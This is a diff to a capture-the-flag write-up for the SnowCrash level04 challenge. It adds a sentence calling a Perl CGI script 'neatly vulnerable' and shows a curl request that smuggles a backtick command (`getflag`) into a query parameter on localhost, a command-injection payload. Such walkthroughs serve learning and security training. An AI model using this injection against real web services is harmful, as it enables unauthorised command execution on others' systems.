@@ -24,11 +24,8 @@ sub x {
 }
 x(param("x"));
 ```
-https://www.tutorialspoint.com/perl/perl_subroutines.htm
+After a crash course in perl [subroutines](https://www.tutorialspoint.com/perl/perl_subroutines.htm) and the [CGI](https://www.perl.com/article/perl-and-cgi/) module we see that we are provided a neatly vulnerable code.
 
-https://www.perl.com/article/perl-and-cgi/#why-not-to-use-cgi
-
-https://metacpan.org/dist/CGI/view/lib/CGI.pod#Fetching-the-value-or-values-of-a-single-named-parameter
 ```
 level04@SnowCrash:~$ curl 'http://localhost:4747/level04.pl?x=`getflag`'
 ```
